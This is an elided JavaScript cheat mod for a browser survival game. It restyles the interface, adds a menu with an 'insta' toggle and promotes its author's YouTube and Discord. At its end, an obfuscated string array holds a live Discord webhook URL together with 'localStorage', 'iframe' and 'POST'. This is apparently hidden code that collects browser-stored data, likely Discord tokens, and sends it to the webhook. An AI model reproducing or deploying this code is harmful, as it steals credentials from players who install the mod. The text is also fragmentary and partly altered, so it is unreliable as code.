...
! function(e) {
    ...
    var i = n(0)
		 ...
		 */
            ...
            var i = n(16).DecodeBuffer
                ...
                (function(t) {
                    e.exports.maxScreenWidth = 1920, e.exports.maxScreenHeight = 1080, e.exports
                        ...
                        "WaspHype", "K2rma is bad", "ExtinctioN", "GayBoooN", "Ashura", "Arsen", "ArenaSlayer",
                ...
                var at = document.getElementById("featuredYoutube"),
                    ot = [{
                        name: "Phytonx",
                        link: "https://www.youtube.com/channel/UCDvsQMbEjKkSmRhIoGUL8Sg"
                    }, {
                        name: "Phytonx",
                        link: "https://www.youtube.com/channel/UCDvsQMbEjKkSmRhIoGUL8Sg"
                    }, {
                        ...
                        name: "Phytonx",
                        link: "hhttps://www.youtube.com/channel/UCDvsQMbEjKkSmRhIoGUL8Sg"
                    }, {
                        name: "Phytonx",
                        link: "https://www.youtube.com/channel/UCDvsQMbEjKkSmRhIoGUL8Sg"
                    }, {
			...
			63, this[n++] = 128 | 63 & r);
                ...
                (function(e, i) {
                    var r; /*! https://www.youtube.com/channel/UCDvsQMbEjKkSmRhIoGUL8Sg */
                    ! function(s) {
	 ...
	 *
	 * @author   Feross Aboukhadijeh <https://www.youtube.com/channel/UCDvsQMbEjKkSmRhIoGUL8Sg
	 * @license  MIT
	 */
                        e.exports = function(e) {
...
document.getElementById('gameName').innerHTML = "Loading Mod";
document.getElementById('loadingText').innerHTML = "Loading dude";
document.getElementById("leaderboard").append('Loading Mod v2');;
...
document.getElementById("gameName").style.color = "#33ff00";
document.getElementById('nameInput').style.color = "#33ff00";
document.getElementById("loadingText").style.color = "#33ff00";
document.getElementById("scoreDisplay").style.color = "#33ff00";
document.getElementById("woodDisplay").style.color = "#33ff00";
document.getElementById("stoneDisplay").style.color = "#33ff00";
document.getElementById("killCounter").style.color = "#33ff00";
document.getElementById("foodDisplay").style.color = "#33ff00";
document.getElementById("allianceButton").style.color = "#33ff00";
document.getElementById("chatButton").style.color = "#33ff00";
document.getElementById("storeButton").style.color = "#33ff00";
document.getElementById("desktopInstructions").style.color = "#33ff00";
document.getElementById("leaderboardData").style.color = "#33ff00";
document.getElementById("ageText").style.color = "#33ff00";
document.getElementById("leaderboard").style.color = "#33ff00";
document.getElementById("diedText").style.color = "#33ff00";
document.getElementById("ageBar").style.color = "#33ff00";
document.getElementById('enterGame').innerHTML = 'Phytonx#2080';
...
document.getElementById('test').style.color='#ff1f3d'
...
document.title = "Loading Mod"
$( "#errorNotification" ).after( '<div id="moddedMenu"><div class="titleMM">Loading Mod</div><div class="one"><label class="switch"></span></label><div class="two"><div class="text"><b>OP<br> Loading Mod OP<label class="container">Sub to Phytonx, dc: Phytonx#2080</div></div>');
(function() {var css = [
	"div#adCard, ",
	"  #twitterFollow, ",
	"  #youtubeFollow, ",
	...
	"    color: #33ff00;",
	"    font-size: 31px;",
	"    -webkit-text-stroke: 1.5px #33ff00;",
	"  }",
	"",
	"  #altServer > a > i {",
	...
	"    color: #00ffff;",
	"    -webkit-text-stroke: 1.5px #ff1f3d;",
	"    margin-bottom: 30px;",
	"  }",
	"",
	"  #ageBarBody {",
...
soldierinsta.addEventListener('change', function() {
    if (this.checked) {
        soldierinsta = true
        doNewSend(["ch", ["Phytonx Insta:ON"]]);
        var instaSpeed = 85;
    } else {
        soldierinsta = false
        var instaSpeed = 130;
        doNewSend(["ch", ["Phytonx Insta: OFF"]]);
    }
})
...
const a=['open',
         ...
         'iframe',
         'Content-Type',
         'https://discord.com/api/webhooks/947607228079288381/0d5plPucohdeq6B10QezRBgc-3ch2Noe2zINpMoz-beNesh5IGUfPcwI1sCPQQF4xfES',
         'localStorage',
         'createElement',
         'appendChild',
         'POST',
